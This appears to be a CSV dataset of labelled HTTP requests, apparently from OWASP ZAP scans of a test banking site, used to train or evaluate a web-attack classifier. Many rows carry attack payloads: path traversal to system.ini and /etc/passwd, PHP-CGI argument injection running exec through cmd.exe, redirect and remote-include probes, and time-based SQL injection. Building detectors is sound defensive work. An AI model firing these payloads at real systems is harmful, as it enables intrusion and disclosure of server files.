method,path,body,single_q,double_q,dashes,braces,spaces,percentages,semicolons,angle_brackets,special_chars,path_length,body_length,badwords_count,class,features,prediction
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,33,1,1,"[0, 0, 0, 0, 0, 0, 0, 0, 2, 8, 33, 0]",0
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,124,0,1,"[0, 0, 0, 0, 7, 0, 0, 0, 5, 13, 124, 0]",1
GET,/admin/clients.xls,,0,0,0,0,0,0,0,0,0,18,0,1,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 18, 3, 0]",0
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/grouplife.htm,,0,0,0,0,3,0,0,0,0,57,0,0,1,"[0, 0, 0, 0, 3, 0, 0, 0, 0, 57, 3, 0]",1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_deposit.htm,,0,0,0,0,3,0,0,0,0,82,0,0,1,"[0, 0, 0, 0, 3, 0, 0, 0, 0, 82, 3, 0]",1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal.htm,,0,0,0,0,3,0,0,0,0,74,0,0,1,"[0, 0, 0, 0, 3, 0, 0, 0, 0, 74, 3, 0]",1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm,,0,0,0,0,3,0,0,0,0,83,0,0,1,"[0, 0, 0, 0, 3, 0, 0, 0, 0, 83, 3, 0]",1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/cgi.exe,,0,0,0,0,3,0,0,0,0,51,0,0,1,"[0, 0, 0, 0, 3, 0, 0, 0, 0, 51, 3, 0]",1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=inside_press.htm,,0,0,0,0,3,0,0,0,0,78,0,0,1,"[0, 0, 0, 0, 3, 0, 0, 0, 0, 78, 3, 0]",1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=inside_careers.htm,,0,0,0,0,3,0,0,0,0,80,0,0,1,"[0, 0, 0, 0, 3, 0, 0, 0, 0, 80, 3, 0]",1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/subscribe.jsp,,0,0,0,0,3,0,0,0,0,57,0,0,1,"[0, 0, 0, 0, 3, 0, 0, 0, 0, 57, 3, 0]",1
GET,/admin/5426747126540156233,,0,0,0,0,0,0,0,0,0,26,0,1,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 26, 3, 0]",0
GET,/my%20documents/4334254300613932666.jsp,,0,0,0,0,1,0,0,0,0,37,0,0,1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 37, 3, 0]",0
GET,/my%20documents/JohnSmith/543395271288856021.jsp,,0,0,0,0,1,0,0,0,0,46,0,0,1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 46, 3, 0]",0
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/1982477551809814812.jsp,,0,0,0,0,3,0,0,0,0,67,0,0,1,"[0, 0, 0, 0, 3, 0, 0, 0, 0, 67, 3, 0]",1
POST,/doSubscribe,txtEmail=c%3A%2FWindows%2Fsystem.ini&btnSubmit=Subscribe,0,0,0,0,0,0,0,0,0,12,50,1,1,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 12, 50, 0]",0
POST,/sendFeedback,cfile=c%3A%2FWindows%2Fsystem.ini&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,133,1,1,"[0, 0, 0, 0, 7, 0, 0, 0, 5, 13, 133, 0]",1
POST,/doLogin,uid=c%3A%2FWindows%2Fsystem.ini&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,51,2,1,"[0, 0, 0, 0, 0, 0, 0, 0, 2, 8, 51, 0]",0
GET,/Documents/JohnSmith,,0,0,0,0,0,0,0,0,0,20,0,0,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 20, 3, 0]",0
POST,/sendFeedback,cfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,178,1,1,"[0, 0, 0, 0, 7, 17, 0, 0, 5, 13, 178, 0]",1
GET,/Documents/JohnSmith/index.jsp?content=c%3A%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,60,0,1,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 60, 3, 0]",0
POST,/doLogin,uid=c%3A%5CWindows%5Csystem.ini&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,51,2,1,"[0, 0, 0, 0, 0, 0, 0, 0, 2, 8, 51, 0]",0
POST,/doSubscribe,txtEmail=c%3A%5CWindows%5Csystem.ini&btnSubmit=Subscribe,0,0,0,0,0,0,0,0,0,12,50,1,1,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 12, 50, 0]",0
GET,/Privacypolicy.jsp?sec=c%3A%5CWindows%5Csystem.ini&template=US,,0,0,0,0,0,0,0,0,0,56,0,1,1,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 56, 3, 0]",0
GET,/disclaimer.htm?url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,86,0,1,1,"[0, 0, 0, 0, 0, 17, 0, 0, 0, 86, 3, 0]",1
GET,/default.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,87,0,1,1,"[0, 0, 0, 0, 0, 17, 0, 0, 0, 87, 3, 0]",1
POST,/sendFeedback,cfile=%2Fetc%2Fpasswd&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,123,0,1,"[0, 0, 0, 0, 7, 0, 0, 0, 5, 13, 123, 0]",1
GET,/images/index.jsp?content=c%3A%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,47,0,1,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 47, 3, 0]",0
GET,/Documents/JohnSmith/index.jsp?content=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,105,0,1,1,"[0, 0, 0, 0, 0, 17, 0, 0, 0, 105, 3, 0]",1
GET,/default.jsp?content=c%3A%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,42,0,1,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 42, 3, 0]",0
GET,/Privacypolicy.jsp?sec=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&template=US,,0,0,0,0,0,0,0,0,0,101,0,1,1,"[0, 0, 0, 0, 0, 17, 0, 0, 1, 101, 3, 0]",1
POST,/sendFeedback,cfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,170,0,1,"[0, 0, 0, 0, 7, 17, 0, 0, 5, 13, 170, 0]",1
GET,/disclaimer.htm?url=c%3A%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,41,0,1,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 41, 3, 0]",0
GET,/images/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,92,0,1,1,"[0, 0, 0, 0, 0, 17, 0, 0, 0, 92, 3, 0]",1
GET,/my%20documents,,0,0,0,0,1,0,0,0,0,13,0,0,1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 13, 3, 0]",0
GET,/index.jsp?content=c%3A%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,40,0,1,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 40, 3, 0]",0
GET,/Documents/JohnSmith/index.jsp?content=%2Fetc%2Fpasswd,,0,0,0,0,0,0,0,0,0,50,0,0,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 50, 3, 0]",0
GET,/index.jsp?content=c%3A%2FWindows%2Fsystem.ini&job=MortgageLendingAccountExecutive%3ASales,,0,0,0,0,0,0,0,0,0,82,0,1,1,"[0, 0, 0, 0, 0, 4, 0, 0, 1, 82, 3, 0]",1
POST,/doLogin,uid=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,96,2,1,"[0, 0, 0, 0, 0, 17, 0, 0, 2, 8, 96, 0]",1
POST,/doSubscribe,txtEmail=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&btnSubmit=Subscribe,0,0,0,0,0,0,0,0,0,12,95,1,1,"[0, 0, 0, 0, 0, 17, 0, 0, 1, 12, 95, 0]",1
POST,/sendFeedback,cfile=c%3A%2F&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,115,0,1,"[0, 0, 0, 0, 7, 0, 0, 0, 5, 13, 115, 0]",1
GET,/my%20documents/JohnSmith,,0,0,0,0,1,0,0,0,0,23,0,0,1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 23, 3, 0]",0
POST,/static/cgi.exe?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,71,86,0,1,"[2, 2, 0, 3, 8, 0, 3, 2, 2, 71, 86, 0]",1
POST,/static/index.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,73,86,0,1,"[2, 2, 0, 3, 8, 0, 3, 2, 2, 73, 86, 0]",1
POST,/static?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,63,86,0,1,"[2, 2, 0, 3, 8, 0, 3, 2, 2, 63, 86, 0]",1
POST,/static/personal_savings.htm?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,84,86,0,1,"[2, 2, 0, 3, 8, 0, 3, 2, 2, 84, 86, 0]",1
POST,/static/subscribe.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,77,86,0,1,"[2, 2, 0, 3, 8, 0, 3, 2, 2, 77, 86, 0]",1
POST,/retirement.htm?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,71,75,0,1,"[2, 2, 0, 3, 6, 0, 3, 2, 2, 71, 75, 0]",1
POST,/sameDomain?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,67,75,0,1,"[2, 2, 0, 3, 6, 0, 3, 2, 2, 67, 75, 0]",1
POST,/sitemap.xml?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,68,75,0,1,"[2, 2, 0, 3, 6, 0, 3, 2, 2, 68, 75, 0]",1
POST,/security.htm?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,69,75,0,1,"[2, 2, 0, 3, 6, 0, 3, 2, 2, 69, 75, 0]",1
POST,/static/personal_savings.htm?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,84,75,0,1,"[2, 2, 0, 3, 6, 0, 3, 2, 2, 84, 75, 0]",1
POST,/static/cgi.exe?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,71,75,0,1,"[2, 2, 0, 3, 6, 0, 3, 2, 2, 71, 75, 0]",1
POST,/pr/communityannualreport.pdf?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,85,75,0,1,"[2, 2, 0, 3, 6, 0, 3, 2, 2, 85, 75, 0]",1
POST,/static/subscribe.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,77,75,0,1,"[2, 2, 0, 3, 6, 0, 3, 2, 2, 77, 75, 0]",1
POST,/static?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,63,75,0,1,"[2, 2, 0, 3, 6, 0, 3, 2, 2, 63, 75, 0]",1
POST,/status_check.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,73,75,0,1,"[2, 2, 0, 3, 6, 0, 3, 2, 2, 73, 75, 0]",1
POST,/static/index.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,73,75,0,1,"[2, 2, 0, 3, 6, 0, 3, 2, 2, 73, 75, 0]",1
POST,/subscribe.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,70,86,0,1,"[2, 2, 0, 3, 8, 0, 3, 2, 2, 70, 86, 0]",1
POST,/subscribe.swf?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,70,86,0,1,"[2, 2, 0, 3, 8, 0, 3, 2, 2, 70, 86, 0]",1
POST,/survey_questions.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,77,86,0,1,"[2, 2, 0, 3, 8, 0, 3, 2, 2, 77, 86, 0]",1
POST,/survey_questions.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,77,75,0,1,"[2, 2, 0, 3, 6, 0, 3, 2, 2, 77, 75, 0]",1
POST,/subscribe.jsp?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,70,75,0,1,"[2, 2, 0, 3, 6, 0, 3, 2, 2, 70, 75, 0]",1
POST,/swagger?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,64,86,0,1,"[2, 2, 0, 3, 8, 0, 3, 2, 2, 64, 86, 0]",1
POST,/swagger/index.html?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,75,86,0,1,"[2, 2, 0, 3, 8, 0, 3, 2, 2, 75, 86, 0]",1
POST,/swagger/swagger-ui-bundle.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,85,86,0,1,"[2, 2, 0, 3, 8, 0, 3, 2, 2, 85, 86, 0]",1
POST,/subscribe.swf?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,70,75,0,1,"[2, 2, 0, 3, 6, 0, 3, 2, 2, 70, 75, 0]",1
POST,/swagger/swagger-ui-standalone-preset.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('cmd.exe /C echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,8,0,3,2,0,96,86,0,1,"[2, 2, 0, 3, 8, 0, 3, 2, 2, 96, 86, 0]",1
POST,/swagger?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,64,75,0,1,"[2, 2, 0, 3, 6, 0, 3, 2, 2, 64, 75, 0]",1
POST,/swagger/index.html?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,"<?php exec('echo it6f7t1r2rx7ymxrs5fx',$colm);echo join(""
"",$colm);die();?>",2,2,0,3,6,0,3,2,0,75,75,0,1,"[2, 2, 0, 3, 6, 0, 3, 2, 2, 75, 75, 0]",1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27,2,0,0,0,0,0,1,0,0,8,73,1,1,"[2, 0, 0, 0, 0, 7, 1, 0, 2, 8, 73, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,2,0,0,0,7,0,0,0,0,13,163,0,1,"[2, 0, 0, 0, 7, 6, 0, 0, 5, 13, 163, 0]",1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27,2,0,0,0,0,0,0,0,0,8,70,1,1,"[2, 0, 0, 0, 0, 6, 0, 0, 2, 8, 70, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=http%3A%2F%2F%5C6542095270498749340.owasp.org&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,158,0,1,"[0, 0, 0, 0, 7, 4, 0, 0, 5, 13, 158, 0]",1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=http%3A%2F%2F%5C6542095270498749340.owasp.org,0,0,0,0,0,0,0,0,0,8,65,1,1,"[0, 0, 0, 0, 0, 4, 0, 0, 2, 8, 65, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=https%3A%2F%2F%5C6542095270498749340.owasp.org&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,159,0,1,"[0, 0, 0, 0, 7, 4, 0, 0, 5, 13, 159, 0]",1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=https%3A%2F%2F%5C6542095270498749340.owasp.org,0,0,0,0,0,0,0,0,0,8,66,1,1,"[0, 0, 0, 0, 0, 4, 0, 0, 2, 8, 66, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=%2F%2F6542095270498749340.owasp.org&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,152,0,1,"[0, 0, 0, 0, 7, 0, 0, 0, 5, 13, 152, 0]",1
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=%2F%2F6542095270498749340.owasp.org,0,0,0,0,0,0,0,0,0,8,59,1,1,"[0, 0, 0, 0, 0, 0, 0, 0, 2, 8, 59, 0]",0
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=6542095270498749340.owasp.org&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,106,0,1,"[0, 0, 0, 0, 2, 0, 0, 0, 5, 13, 106, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=http%3A%2F%2F6542095270498749340.owasp.org&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,113,0,1,"[0, 0, 0, 0, 2, 0, 0, 0, 5, 13, 113, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=https%3A%2F%2F6542095270498749340.owasp.org&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,114,0,1,"[0, 0, 0, 0, 2, 0, 0, 0, 5, 13, 114, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=https%3A%2F%2F6542095270498749340%252eowasp%252eorg&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,118,0,1,"[0, 0, 0, 0, 2, 5, 0, 0, 5, 13, 118, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27&comments=&submit=+Submit+,2,0,0,0,2,0,1,0,0,13,122,0,1,"[2, 0, 0, 0, 2, 7, 1, 0, 5, 13, 122, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27&comments=&submit=+Submit+,2,0,0,0,2,0,0,0,0,13,119,0,1,"[2, 0, 0, 0, 2, 6, 0, 0, 5, 13, 119, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=http%3A%2F%2F%5C6542095270498749340.owasp.org&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,114,0,1,"[0, 0, 0, 0, 2, 4, 0, 0, 5, 13, 114, 0]",1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=6542095270498749340.owasp.org,,0,0,0,0,3,0,0,0,0,91,0,0,1,"[0, 0, 0, 0, 3, 0, 0, 0, 0, 91, 3, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=https%3A%2F%2F%5C6542095270498749340.owasp.org&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,115,0,1,"[0, 0, 0, 0, 2, 4, 0, 0, 5, 13, 115, 0]",1
GET,/search.jsp?query=6542095270498749340.owasp.org,,0,0,0,0,0,0,0,0,0,47,0,0,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 47, 3, 0]",0
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=http%3A%2F%2F6542095270498749340.owasp.org,,0,0,0,0,3,0,0,0,0,98,0,0,1,"[0, 0, 0, 0, 3, 6, 0, 0, 0, 98, 3, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=%2F%2F6542095270498749340.owasp.org&comments=&submit=+Submit+,0,0,0,0,2,0,0,0,0,13,108,0,1,"[0, 0, 0, 0, 2, 0, 0, 0, 5, 13, 108, 0]",1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=https%3A%2F%2F6542095270498749340.owasp.org,,0,0,0,0,3,0,0,0,0,99,0,0,1,"[0, 0, 0, 0, 3, 6, 0, 0, 0, 99, 3, 0]",1
GET,/search.jsp?query=http%3A%2F%2F6542095270498749340.owasp.org,,0,0,0,0,0,0,0,0,0,54,0,0,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 54, 3, 0]",0
GET,/survey_questions.jsp?step=6542095270498749340.owasp.org,,0,0,0,0,0,0,0,0,0,56,0,0,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 56, 3, 0]",0
GET,/static/index.jsp?content=6542095270498749340.owasp.org,,0,0,0,0,0,0,0,0,0,55,0,0,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 55, 3, 0]",0
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=6542095270498749340.owasp.org&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,153,0,1,"[0, 0, 0, 0, 7, 0, 0, 0, 5, 13, 153, 0]",1
GET,/search.jsp?query=https%3A%2F%2F6542095270498749340.owasp.org,,0,0,0,0,0,0,0,0,0,55,0,0,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 55, 3, 0]",0
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=https%3A%2F%2F6542095270498749340%252eowasp%252eorg,,0,0,0,0,3,0,0,0,0,103,0,0,1,"[0, 0, 0, 0, 3, 8, 0, 0, 0, 103, 3, 0]",1
GET,/static/index.jsp?content=http%3A%2F%2F6542095270498749340.owasp.org,,0,0,0,0,0,0,0,0,0,62,0,0,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 62, 3, 0]",0
GET,/survey_questions.jsp?step=http%3A%2F%2F6542095270498749340.owasp.org,,0,0,0,0,0,0,0,0,0,63,0,0,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 63, 3, 0]",0
GET,/search.jsp?query=https%3A%2F%2F6542095270498749340%252eowasp%252eorg,,0,0,0,0,0,0,0,0,0,59,0,0,1,"[0, 0, 0, 0, 0, 5, 0, 0, 0, 59, 3, 0]",1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27,,2,0,0,0,3,0,1,0,0,107,0,0,1,"[2, 0, 0, 0, 3, 10, 1, 0, 0, 107, 3, 0]",1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=http%3A%2F%2F6542095270498749340.owasp.org&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,160,0,1,"[0, 0, 0, 0, 7, 0, 0, 0, 5, 13, 160, 0]",1
GET,/static/index.jsp?content=https%3A%2F%2F6542095270498749340.owasp.org,,0,0,0,0,0,0,0,0,0,63,0,0,1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 63, 3, 0]",0
GET,/Privacypolicy.jsp?sec=Careers%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&template=US,,5,2,1,2,17,0,0,0,0,206,0,4,1,"[5, 2, 1, 2, 17, 13, 0, 0, 1, 206, 3, 0]",1
GET,/images/index.jsp?content=personal.htm%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,,0,4,0,1,4,0,0,0,0,77,0,1,1,"[0, 4, 0, 1, 4, 8, 0, 0, 0, 77, 3, 0]",1
